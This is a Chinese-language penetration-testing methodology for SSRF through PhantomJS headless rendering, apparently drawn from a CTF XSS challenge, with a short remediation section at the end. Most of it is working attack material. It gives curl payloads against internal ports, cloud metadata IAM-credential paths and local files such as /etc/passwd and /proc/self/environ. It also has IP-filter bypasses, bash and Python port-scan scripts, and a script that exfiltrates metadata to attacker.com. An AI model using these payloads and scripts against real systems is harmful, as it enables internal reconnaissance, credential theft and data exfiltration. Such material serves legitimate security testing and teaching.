# SSRF via PhantomJS 内网扫描方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 SSRF via PhantomJS 内网扫描与探测流程，帮助识别和利用 headless 浏览器渲染用户控制 HTML 内容导致的服务器端请求伪造漏洞，实现内网服务探测、端口扫描和敏感信息收集。

## 1.2 适用范围

本文档适用于以下类型的应用：
- 使用 PhantomJS、Puppeteer、Playwright 等 headless 浏览器渲染用户控制 HTML 的系统
- XSS 验证服务、截图服务、PDF 生成服务
- 链接预览、性能测试等需要加载外部 URL 的功能
- CTF 挑战应用、安全培训平台

## 1.3 读者对象

- 执行渗透测试任务的安全工程师
- 进行内网渗透的红队成员
- CTF 参赛选手

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

SSRF via PhantomJS 是指攻击者通过注入恶意 HTML 内容（通常包含资源加载标签如 `<img>`、`<iframe>`、`<link>`），诱导 headless 浏览器（如 PhantomJS）从服务器端加载内部网络资源或执行恶意 JavaScript，从而实现：
- 内网服务探测
- 端口扫描
- 云元数据服务访问
- 本地文件读取（通过 file:// 协议）

**本质问题**：应用使用 headless 浏览器渲染未经验证的用户控制 HTML 内容，且 PhantomJS 运行在服务器网络上下文中，可以访问内部网络资源。

### 信任边界违规

```
外部用户 (Internet)
       │
       ▼
┌──────────────────┐
│   Flask 应用     │  Port 43647 (公开)
│   (Port 5000)    │
└────────┬─────────┘
         │
         │ 1. 用户提交恶意 HTML
         │    <img src="http://127.0.0.1:6379/">
         ▼
┌──────────────────┐
│   PhantomJS      │  运行在服务器网络上下文
│   (Port N/A)     │  可访问：
└────────┬─────────┘  - localhost 服务
         │            - 内网服务 (10.x.x.x, 192.168.x.x)
         │            - 云元数据 (169.254.169.254)
         ▼            - 本地文件 (file://)
2. PhantomJS 加载资源
   从服务器网络上下文发起请求
```

### 典型应用场景

| 应用场景 | 功能描述 | 风险点 |
|---------|---------|-------|
| **XSS 验证服务** | 验证用户提交的 XSS Payload 是否执行 | PhantomJS 渲染用户 HTML，可注入资源加载 |
| **截图服务** | 生成网页截图 | PhantomJS 加载用户控制的 URL |
| **PDF 生成** | 将 HTML 转为 PDF | PhantomJS 渲染用户控制的 HTML |
| **链接预览** | 生成链接预览卡片 | 抓取并渲染外部 URL |
| **CTF 挑战** | XSS 挑战平台 | 故意设计脆弱过滤供学员练习 |

### 技术环境特征

```
框架：Flask 1.1.4 (或类似版本)
Python 版本：Python 2.7.18 (EOL) 或 Python 3.x
浏览器引擎：PhantomJS 2.1.1 (已废弃，基于 WebKit)
协议支持：http://, https://, file://
网络访问：完整 localhost + 内网访问能力
超时配置：通常 5 秒超时 (timeout 命令限制)
```

## 2.2 攻击常见于哪些业务场景

### 2.2.1 CTF XSS 挑战应用

**场景描述**：CTF 挑战使用 PhantomJS 验证 XSS Payload 是否执行。

**案例分析**：

```python
# 典型 CTF 验证逻辑
@app.route('/page')
def xss_challenge():
    msg = request.args.get('url', '')
    
    # 弱黑名单过滤
    msg = re.sub(r'\"', "", msg)
    msg = re.sub(r"[<>]", "", msg)
    msg = re.sub(r'\b(?!(https?|file)://)\S+\.(?!(jpg|jpeg|png|gif|bmp|svg)\b)[^\s]*', "", msg, flags=re.IGNORECASE)
    
    # 嵌入 iframe src 属性
    value = 'src="{0}"'.format(msg)
    html = TEMPLATE.format(value)
    
    # PhantomJS 渲染 HTML
    result = check_xss(html)
    
    # 验证成功返回 Flag
    if result == 'xss':
        return f"Congratulations! Here is the flag: {FLAG}"
```

**风险点**：
- 用户输入通过 iframe src 间接传递给 PhantomJS
- file:// 协议明确允许
- PhantomJS 可访问 localhost 和内网服务

### 2.2.2 内网服务探测

**场景描述**：攻击者通过 SSRF 探测目标内网运行的服务。

**可探测服务**：

| 端口 | 服务 | 探测 Payload |
|-----|------|-------------|
| 22 | SSH | `<img src="http://127.0.0.1:22/">` |
| 80 | HTTP | `<img src="http://127.0.0.1:80/">` |
| 443 | HTTPS | `<img src="https://127.0.0.1:443/">` |
| 3306 | MySQL | `<img src="http://127.0.0.1:3306/">` |
| 5432 | PostgreSQL | `<img src="http://127.0.0.1:5432/">` |
| 6379 | Redis | `<img src="http://127.0.0.1:6379/">` |
| 8080 | HTTP Alt | `<img src="http://127.0.0.1:8080/">` |
| 9200 | Elasticsearch | `<img src="http://127.0.0.1:9200/">` |
| 27017 | MongoDB | `<img src="http://127.0.0.1:27017/">` |

### 2.2.3 云元数据服务访问

**场景描述**：如果应用部署在云环境（AWS、GCP、Azure），可通过 SSRF 访问元数据服务获取敏感信息。

**云元数据端点**：

| 云提供商 | 元数据 URL | 敏感信息 |
|---------|-----------|---------|
| **AWS EC2** | `http://169.254.169.254/latest/meta-data/` | IAM 凭证、实例信息 |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` | 服务账户凭证 |
| **Azure** | `http://169.254.169.254/metadata/instance` | 虚拟机配置、凭证 |

## 2.3 漏洞探测方法

### 2.3.1 黑盒测试

#### 步骤 1：确认 PhantomJS 使用

```bash
# 测试响应时间（PhantomJS 执行通常 2-5 秒）
time curl "http://localhost:43647/page?url=test"

# 如果响应时间显著增加（>2 秒），可能使用了 PhantomJS

# 测试错误消息
curl "http://localhost:43647/page?url=http://nonexistent.invalid/"
# 如果返回 "Failed! Try again!" 或类似错误，说明 PhantomJS 尝试加载但失败
```

#### 步骤 2：基础 SSRF 探测

```bash
# 测试 localhost 访问
curl "http://localhost:43647/page?url=http://localhost:5000"

# 观察响应：
# - 如果返回 "TypeError: Attempting to change the setter..." 说明 PhantomJS 成功加载
# - 如果返回 "Failed! Try again!" 说明连接失败

# 测试 file:// 协议
curl "http://localhost:43647/page?url=file:///etc/passwd"

# 观察响应：
# - 如果返回 TypeError 说明 file:// 协议被处理
```

#### 步骤 3：DNSLog 检测

```bash
# 使用 DNSLog 检测 SSRF
curl "http://localhost:43647/page?url=http://test.dnslog.cn"

# 检查 DNSLog 平台是否收到 DNS 请求
# 如果收到，说明 PhantomJS 执行了资源加载
```

#### 步骤 4：时间延迟检测

```bash
# 测试可达主机（响应快）
time curl "http://localhost:43647/page?url=http://localhost:80"
# 预期：~2 秒（PhantomJS 处理时间）

# 测试不可达主机（超时）
time curl "http://localhost:43647/page?url=http://nonexistent.invalid:80"
# 预期：~5 秒（超时时间）

# 时间差异可用于判断主机/端口是否可达
```

### 2.3.2 白盒测试

**代码审计要点**：

```python
# ❌ 危险代码示例

# 场景 1：file:// 协议明确允许
msg = re.sub(r'\b(?!(https?|file)://)\S+\.(?!(jpg|jpeg|png|gif|bmp|svg)\b)[^\s]*', "", msg, flags=re.IGNORECASE)
# file:// 在负向前瞻中，明确允许

# 场景 2：PhantomJS 加载用户控制 URL
proc = subprocess.Popen(["timeout", "5", "phantomjs", "check.js"],
                        stdout=subprocess.PIPE, stdin=subprocess.PIPE)
(stdout, stderr) = proc.communicate(url + '\n')
# 用户控制的 URL 传递给 PhantomJS

# 场景 3：无 IP 地址过滤
# 代码中没有检查 127.0.0.1、10.x.x.x、192.168.x.x 等内网 IP
```

**check.js 典型逻辑**：

```javascript
// check.js 典型代码
var system = require('system');
var webpage = require('webpage');
var url = system.stdin.readLine();

var page = webpage.create();

page.open(url, function(status) {
    if (status === 'success') {
        // 页面加载成功
        console.log('Page loaded');
    } else {
        // 页面加载失败
        console.log('Page failed');
    }
    phantom.exit();
});
```

## 2.4 漏洞利用方法

### 2.4.1 内网端口扫描

#### 2.4.1.1 定时扫描法

**原理**：通过响应时间差异判断端口是否开放。

```bash
#!/bin/bash
# 内网端口扫描脚本

TARGET_HOST="localhost"
PORTS=(22 80 443 3306 5432 6379 8080 9200 27017)
SSRF_URL="http://localhost:43647/page"

echo "Starting SSRF port scan on $TARGET_HOST"
echo "=========================================="

for PORT in "${PORTS[@]}"; do
    START=$(date +%s.%N)
    
    RESPONSE=$(curl -s "$SSRF_URL?url=http://$TARGET_HOST:$PORT/")
    
    END=$(date +%s.%N)
    DURATION=$(echo "$END - $START" | bc)
    
    # 判断响应类型
    if echo "$RESPONSE" | grep -q "TypeError"; then
        STATUS="OPEN (responding)"
    elif echo "$RESPONSE" | grep -q "Failed"; then
        STATUS="CLOSED/filtered"
    else
        STATUS="UNKNOWN"
    fi
    
    echo "Port $PORT: $STATUS (${DURATION}s)"
done

echo "=========================================="
echo "Scan completed"
```

**判断逻辑**：
- **~2 秒 + TypeError**：端口开放，服务响应
- **~5 秒 + Failed**：端口关闭或主机不可达
- **~5 秒 + TypeError**：端口开放但服务无 HTTP 响应

#### 2.4.1.2 错误消息分析法

**原理**：通过 PhantomJS 返回的错误消息判断服务类型。

```bash
# 测试 Redis (6379)
curl "http://localhost:43647/page?url=http://localhost:6379/"
# Redis 返回 "-ERR unknown command" → TypeError

# 测试 MySQL (3306)
curl "http://localhost:43647/page?url=http://localhost:3306/"
# MySQL 返回协议握手 → TypeError

# 测试 HTTP (80)
curl "http://localhost:43647/page?url=http://localhost:80/"
# HTTP 返回 HTML → 可能触发不同错误
```

### 2.4.2 内网服务探测

#### 2.4.2.1 Flask 应用自访问

```bash
# 访问内部 Flask 应用（Port 5000）
curl "http://localhost:43647/page?url=http://localhost:5000"

# 响应分析：
# - TypeError: Flask 应用存在且响应
# - Failed: Flask 应用不存在或未响应
```

#### 2.4.2.2 Apache 服务探测

```bash
# 访问 Apache 服务（Port 8081）
curl "http://localhost:43647/page?url=http://localhost:8081"

# 如果返回 TypeError，说明 Apache 服务存在
# 可进一步探测具体路径
curl "http://localhost:43647/page?url=http://localhost:8081/admin"
curl "http://localhost:43647/page?url=http://localhost:8081/.htaccess"
```

#### 2.4.2.3 未知服务探测

```bash
# 访问 Port 9999 未知服务
curl "http://localhost:43647/page?url=http://localhost:9999"

# 通过错误消息判断服务类型
# TypeError + CORS headers → HTTP 类服务
```

### 2.4.3 云元数据服务访问

#### 2.4.3.1 AWS EC2 元数据

```bash
# 访问元数据根路径
curl "http://localhost:43647/page?url=http://169.254.169.254/latest/meta-data/"

# 访问 IAM 凭证
curl "http://localhost:43647/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 访问实例信息
curl "http://localhost:43647/page?url=http://169.254.169.254/latest/meta-data/instance-id/"
```

#### 2.4.3.2 十进制 IP 绕过

**原理**：如果应用过滤点分十进制 IP，可使用十进制表示绕过。

```bash
# 169.254.169.254 的十进制表示
# 169*256^3 + 254*256^2 + 169*256 + 254 = 2852039166

curl "http://localhost:43647/page?url=http://2852039166/latest/meta-data/"

# 127.0.0.1 的十进制表示
# 127*256^3 + 0*256^2 + 0*256 + 1 = 2130706433

curl "http://localhost:43647/page?url=http://2130706433:5000"
```

### 2.4.4 本地文件读取

#### 2.4.4.1 file:// 协议利用

```bash
# 读取 /etc/passwd
curl "http://localhost:43647/page?url=file:///etc/passwd"

# 读取应用文件
curl "http://localhost:43647/page?url=file:///app/secret.txt"

# 读取环境变量
curl "http://localhost:43647/page?url=file:///proc/self/environ"

# 读取应用源码
curl "http://localhost:43647/page?url=file:///app/app.py"
```

#### 2.4.4.2 文件存在性探测

**原理**：通过响应差异判断文件是否存在。

```bash
# 测试文件存在
time curl "http://localhost:43647/page?url=file:///etc/passwd"
# 预期：~2 秒，TypeError（文件存在）

# 测试文件不存在
time curl "http://localhost:43647/page?url=file:///nonexistent"
# 预期：~2 秒，TypeError（PhantomJS 仍处理请求）

# 注意：file:// 协议下，文件存在与否可能都返回 TypeError
# 需要结合其他方法判断
```

### 2.4.5 组合攻击

#### 2.4.5.1 SSRF + XSS 组合

```html
<!-- 步骤 1：注入 SSRF Payload -->
<img src="http://169.254.169.254/latest/meta-data/">

<!-- 步骤 2：同时注入 XSS 外带数据 -->
<script>
// 在 PhantomJS 中执行
fetch('http://169.254.169.254/latest/meta-data/')
  .then(r => r.text())
  .then(data => {
    // 提取敏感数据
    const flag = data.match(/flag\{.*?\}/);
    if (flag) {
      // 外带数据
      fetch('http://attacker.com/exfil?data=' + flag[0]);
    }
  });
</script>
```

#### 2.4.5.2 多资源并发探测

```html
<!-- 并发探测多个内网服务 -->
<img src="http://127.0.0.1:22/">
<img src="http://127.0.0.1:80/">
<img src="http://127.0.0.1:443/">
<img src="http://127.0.0.1:3306/">
<img src="http://127.0.0.1:6379/">
<img src="http://127.0.0.1:8080/">
<img src="http://127.0.0.1:9200/">
<img src="http://127.0.0.1:27017/">

<!-- 通过响应时间分析哪些服务存在 -->
```

## 2.5 漏洞利用绕过方法

### 2.5.1 URL 验证绕过

#### 2.5.1.1 localhost 主机名绕过

**原理**：如果应用过滤 127.0.0.1 但不过滤 localhost。

```bash
# 使用 localhost 代替 127.0.0.1
curl "http://localhost:43647/page?url=http://localhost:5000"
curl "http://localhost:43647/page?url=http://localhost:6379"
```

#### 2.5.1.2 十进制 IP 绕过

```bash
# 十进制 IP 表示
curl "http://localhost:43647/page?url=http://2130706433"  # 127.0.0.1
curl "http://localhost:43647/page?url=http://2852039166"  # 169.254.169.254
```

#### 2.5.1.3 IPv6 绕过

```bash
# IPv6 表示
curl "http://localhost:43647/page?url=http://[::1]"  # 127.0.0.1
curl "http://localhost:43647/page?url=http://[0:0:0:0:0:ffff:7f00:1]"
```

### 2.5.2 协议限制绕过

#### 2.5.2.1 file:// 协议利用

**原理**：如果应用明确允许 file:// 协议。

```bash
# 直接访问
curl "http://localhost:43647/page?url=file:///etc/passwd"

# URL 编码
curl "http://localhost:43647/page?url=file%3A%2F%2F%2Fetc%2Fpasswd"
```

### 2.5.3 超时限制绕过

**原理**：PhantomJS 有 5 秒超时限制，使用快速响应目标。

```bash
# 本地服务响应时间：1-10ms
curl "http://localhost:43647/page?url=http://localhost:80"

# 云元数据响应时间：20-100ms
curl "http://localhost:43647/page?url=http://169.254.169.254/latest/meta-data/"

# DNS 查询：即时
curl "http://localhost:43647/page?url=http://attacker.com"
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **基础 SSRF** | `http://localhost:5000` | 访问本地服务 |
| **端口扫描** | `http://localhost:6379` | 探测 Redis |
| **AWS 元数据** | `http://169.254.169.254/latest/meta-data/` | 窃取凭证 |
| **十进制 IP** | `http://2852039166` | 绕过 IP 过滤 |
| **文件读取** | `file:///etc/passwd` | 读取系统文件 |
| **环境变量** | `file:///proc/self/environ` | 读取环境变量 |
| **DNSLog** | `http://attacker.com` | 外带检测 |

## 3.2 内网端口扫描清单

| 端口 | 服务 | Payload | 预期响应 |
|-----|------|---------|---------|
| 22 | SSH | `http://localhost:22/` | TypeError |
| 80 | HTTP | `http://localhost:80/` | TypeError |
| 443 | HTTPS | `https://localhost:443/` | TypeError |
| 3306 | MySQL | `http://localhost:3306/` | TypeError |
| 5432 | PostgreSQL | `http://localhost:5432/` | TypeError |
| 6379 | Redis | `http://localhost:6379/` | TypeError |
| 8080 | HTTP Alt | `http://localhost:8080/` | TypeError |
| 9200 | Elasticsearch | `http://localhost:9200/` | TypeError |
| 27017 | MongoDB | `http://localhost:27017/` | TypeError |

## 3.3 自动化扫描脚本

```python
#!/usr/bin/env python3
"""
SSRF via PhantomJS 内网扫描脚本
"""

import requests
import time
import sys

def scan_port(base_url, host, port):
    """
    扫描单个端口
    """
    target = f"http://{host}:{port}/"
    params = {'url': target}
    
    start = time.time()
    response = requests.get(base_url, params=params, timeout=10)
    duration = time.time() - start
    
    # 分析响应
    if "TypeError" in response.text:
        status = "OPEN"
    elif "Failed" in response.text:
        status = "CLOSED"
    else:
        status = "UNKNOWN"
    
    return status, duration

def scan_host(base_url, host, ports):
    """
    扫描主机所有指定端口
    """
    print(f"Scanning {host}...")
    print("=" * 60)
    
    open_ports = []
    
    for port in ports:
        status, duration = scan_port(base_url, host, port)
        
        if status == "OPEN":
            open_ports.append(port)
            print(f"Port {port}: {status} ({duration:.2f}s)")
    
    print("=" * 60)
    print(f"Scan completed. Open ports: {open_ports}")
    
    return open_ports

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 ssrf_scan.py <ssrf_url>")
        print("Example: python3 ssrf_scan.py http://localhost:43647/page")
        sys.exit(1)
    
    ssrf_url = sys.argv[1]
    
    # 常见端口列表
    COMMON_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
    
    # 扫描 localhost
    scan_host(ssrf_url, "localhost", COMMON_PORTS)
    
    # 扫描 127.0.0.1
    scan_host(ssrf_url, "127.0.0.1", COMMON_PORTS)
```

## 3.4 修复建议

### 输入验证

```python
# URL 白名单验证
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = ['example.com', 'www.example.com']
ALLOWED_PROTOCOLS = ['http:', 'https:']

def validate_url(url):
    parsed = urlparse(url)
    
    # 协议检查
    if parsed.scheme not in ALLOWED_PROTOCOLS:
        return False
    
    # IP 地址检查
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except ValueError:
        # 主机名检查
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False
    
    return True
```

### PhantomJS 配置

```javascript
// check.js 安全配置
var page = webpage.create();

// 设置 Content-Security-Policy
page.settings.contentSecurityPolicy = "default-src 'none'";

// 禁用外部资源加载
page.settings.resourceTimeout = 1000;

// 限制协议
page.onResourceRequested = function(request) {
    if (!request.url.startsWith('http://allowed-domain.com')) {
        request.abort();
    }
};
```

### 网络隔离

- 使用容器网络隔离限制 PhantomJS 出站访问
- 配置防火墙规则阻止访问内网 IP
- 使用代理服务器控制出站请求

---

**参考资源**：
- [OWASP Cheat Sheet: SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - SSRF](https://portswigger.net/web-security/ssrf)
- [PhantomJS Security](https://phantomjs.org/security.html)
